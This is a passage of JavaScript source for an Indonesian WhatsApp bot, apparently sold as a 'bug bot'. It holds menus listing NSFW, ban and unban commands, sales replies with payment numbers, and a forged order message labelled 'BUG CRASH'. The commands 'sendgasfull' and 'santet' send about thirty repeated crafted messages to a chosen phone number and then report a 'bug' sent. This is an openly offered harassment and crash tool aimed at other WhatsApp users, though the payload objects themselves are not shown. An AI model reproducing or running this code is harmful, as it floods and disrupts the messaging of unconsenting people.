📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟽𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟾𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟿𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟶𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟷𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟸𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟹𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟺𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟷
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟸
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟹
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟺
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟻
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟼
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟽
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟾
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟻𝟿
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟼𝟶
📄 ${prefix}𝚜𝚘𝚞𝚗𝚍𝟷𝟼𝟷

-          ⎘⌈𝐍𝐒𝐅𝐖𝐌𝐄𝐍𝐔⌋⎘         

📄 ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋
📄 ${prefix}𝚎𝚛𝚘
📄 ${prefix}𝚊𝚛𝚖𝚙𝚒𝚝𝚜
📄 ${prefix}𝚖𝚒𝚕𝚏
📄 ${prefix}𝚑𝚎𝚗𝚝𝚊𝚒
📄 ${prefix}𝚊𝚗𝚊𝚕
📄 ${prefix}𝚑𝚘𝚕𝚘𝚎𝚛𝚘
📄 ${prefix}𝚔𝚞𝚗𝚒
📄 ${prefix}𝚔𝚎𝚝𝚊
📄 ${prefix}𝚕𝚎𝚠𝚍
📄 ${prefix}𝚏𝚎𝚖𝚍𝚘𝚖
📄 ${prefix}𝚏𝚞𝚝𝚊𝚗𝚊𝚛𝚒
📄 ${prefix}𝚎𝚛𝚘𝚢𝚞𝚛𝚒
📄 ${prefix}𝚎𝚛𝚘𝚔𝚎𝚖𝚘
📄 ${prefix}𝚑𝚎𝚗𝚝𝚊𝚒𝟺𝚎𝚟𝚎𝚛𝚢𝚘𝚗𝚎

-          ⎘ ⌈𝐔𝐍𝐌𝐄𝐍𝐔⌋ ⎘         

📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚝𝚒𝚗𝚓𝚊𝚞
📄 ${prefix}𝚝𝚎𝚡𝚝𝚞𝚗𝚋𝚊𝚗𝟷
📄 ${prefix}𝚝𝚎𝚡𝚝𝚞𝚗𝚋𝚊𝚗𝟸
📄 ${prefix}𝚝𝚎𝚡𝚝𝚞𝚗𝚋𝚊𝚗𝟹
📄 ${prefix}𝚝𝚎𝚡𝚝𝚞𝚗𝚋𝚊𝚗𝟺

-          ⎘ ⌈𝐆𝐀𝐒𝐌𝐄𝐍𝐔 ⌋⎘         

📄 ${prefix}𝚋𝚊𝚗𝚗𝚎𝚍
📄 ${prefix}𝚋𝚊𝚗𝚗𝚎𝚍𝚟𝟷
📄 ${prefix}𝚟𝚎𝚛𝚒𝚏
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟷
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟸
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟹
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟺
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟻
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟼
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟽
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟾
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟿
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟷𝟶
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟷𝟷
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://telegra.ph/file/02f5474448116145e5653.jpg`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
soundnya = fs.readFileSync(`./menubot.m4a`)
await sleep(100)
await vinz.sendMessage(m.chat, { audio: soundnya, mimetype: 'audio/mp4', ptt: true, seconds: 9999999999999999 }, {quoted:troli})
break
case 'menustore': case 'storemenu':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) ✓
Ⓟ (Premium) X
Ⓕ (Free) X
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚍𝚘𝚗𝚎
📄 ${prefix}𝚋𝚊𝚝𝚊𝚕
📄 ${prefix}𝚙𝚛𝚘𝚜𝚎𝚜
📄 ${prefix}𝚝𝚞𝚗𝚍𝚊
📄 ${prefix}𝚜𝚘𝚜𝚖𝚎𝚍
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'menusearch': case 'searchmenu':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) ✓
Ⓟ (Premium) X
Ⓕ (Free) X
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚊𝚒
📄 ${prefix}𝚊𝚒𝚒𝚖𝚊𝚐𝚎
📄 ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝
📄 ${prefix}𝚝𝚛𝚊𝚗𝚜𝚕𝚊𝚝𝚎
📄 ${prefix}𝚜𝚜
📄 ${prefix}𝚜𝚑𝚘𝚛𝚝𝚕𝚒𝚗𝚔
📄 ${prefix}𝚋𝚛𝚊𝚒𝚗𝚕𝚢
📄 ${prefix}𝚛𝚘𝚋𝚘𝚐𝚞𝚛𝚞
📄 ${prefix}𝚠𝚒𝚔𝚒𝚙𝚎𝚍𝚒𝚊
📄 ${prefix}𝚓𝚊𝚛𝚊𝚔
📄 ${prefix}𝚔𝚘𝚍𝚎𝚙𝚘𝚜
📄 ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚘𝚕𝚊
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'buy': case 'beli': case 'buysc':
hanzt = `

𝙼𝙰𝚄 𝙱𝚄𝚈 𝚂𝙲?
𝙺𝙴𝚃𝙸𝙺 𝙾𝚆𝙽𝙴𝚁 𝚄𝙽𝚃𝚄𝙺 𝙱𝚄𝚈 𝚂𝙲

𝙼𝙴𝚃𝙾𝙳𝙴 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽?
𐂡 𝙶𝙾𝙿𝙰𝚈 (𝙲𝙷𝙰𝚃 𝙾𝚆𝙽𝙴𝚁)
𐂡 𝙳𝙰𝙽𝙰 (𝙲𝙷𝙰𝚃 𝙾𝚆𝙽𝙴𝚁)
𐂡 𝙿𝚄𝙻𝚂𝙰 (𝙲𝙷𝙰𝚃 𝙾𝚆𝙽𝙴𝚁)

𝚂𝙲 𝙱𝚄𝙶 𝙱𝙾𝚃 𝙱𝚈 𝚅𝚒𝚗𝚣 𝚇𝟽

`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./fefek/egao.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: qpay })
break
case 'buyprem':
case 'jadiprem':
case 'jadiowner':
case 'sewa':
case 'sewaprem':
hanzt = `

𝙼𝙰𝚄 𝚂𝙴𝚆𝙰 𝙿𝚁𝙴𝙼𝙸𝚄𝙼?
𝙺𝙴𝚃𝙸𝙺 𝙾𝚆𝙽𝙴𝚁 𝚄𝙽𝚃𝚄𝙺 𝚂𝙴𝚆𝙰 𝙿𝚁𝙴𝙼𝙸𝚄𝙼

𝙼𝙴𝚃𝙾𝙳𝙴 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽?
𐂡 𝙶𝙾𝙿𝙰𝚈 (𝙲𝙷𝙰𝚃 𝙾𝚆𝙽𝙴𝚁)
𐂡 𝙳𝙰𝙽𝙰 (𝙲𝙷𝙰𝚃 𝙾𝚆𝙽𝙴𝚁)
𐂡 𝙿𝚄𝙻𝚂𝙰 (𝙲𝙷𝙰𝚃 𝙾𝚆𝙽𝙴𝚁)

𝚂𝙲 𝙱𝚄𝙶 𝙱𝙾𝚃 𝙱𝚈 𝚅𝚒𝚗𝚣 𝚇𝟽

`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./fefek/egao.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: qpay })
break
case 'youtube': case 'yt':
jumlah = "1"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© BUG CRASH`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "2023",
"thumbnail": xxtmagev1,
"itemCount": 2023,
"status": "INQUIRY",
"surface": "TEXT",
"message": `Youtube Creator\nhttps://youtube.com/@VinzX7\n\nSubscribe Lah😝`,
"orderTitle": "XXT CORP OFC", // 
"sellerJid": "62858806870154@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted : qpay})
vinz.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'xbuy':
if (!args[0]) return replywalu(`Masukan Nomer Pembeli ${prefix+command} nomor\nContoh ${prefix+command} 628888889699`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replywalu(`Cek Message-nya Kak ${pushname}`)
await sleep(1)
vinz.sendMessage(Pe+'@s.whatsapp.net', { image: xxtmagev1, caption: `𐂡 𝙶𝙾𝙿𝙰𝚈 08561482368
𐂡 𝙳𝙰𝙽𝙰 08561482368
𐂡 𝙿𝚄𝙻𝚂𝙰 08561482368

𐂡 𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙲𝙷𝙰𝚃 𝙾𝚆𝙽𝙴𝚁 𝙺𝙴𝚃𝙸𝙺𝙰 𝙼𝙰𝚄 𝙱𝚄𝚈`},{quoted: floc})
break
case 'getsc':
vinz.sendMessage(m.chat, { text: `𝚂𝙲 𝙸𝙽𝙸 𝙿𝚁𝙸𝚅𝙰𝚃𝙴\n𝚃𝙰𝙿𝙸 𝚈𝙰𝙽𝙶 𝙻𝙰𝙸𝙽 𝙰𝙳𝙰 𝙳𝙸\n𝚈𝚃 𝙶𝚄𝙰: https://youtube.com/@VinzX7`, contextInfo: { mentionedJid: [m.sender], forwardingScore: 9999, isForwarded: true }}, { quoted: troli })
break
case 'listmenu': {
                vinz.sendPoll(m.chat, "Daftar Menunya", ['MenuAll','MenuGroup','MenuDownload','MenuSearch','MenuRandom','MenuMaker','MenuFun','MenuPrimbon','MenuConvert','MenuMain','MenuOwner'])
            }
            break
//▬▭▬▭▬▭▬▭▬▬▭▬▭▬▬▭▬▭▬▭▬▭▬▬▭▬▭▬\\
case 'sendgasfull' :  case '🐵':{
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
 await loading()
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
vinz.sendMessage(Pe, { image: thumb0,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
}
reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
case '🌷': case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌴': case '🌱': case '🌿': case '☘️': case '🍀': case '👺': case 'santet':
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
vinz.sendMessage(Pe, {text : ` ⚠️${pushname}⚠️`},{quoted: vinzsticker})
await sleep(2000)
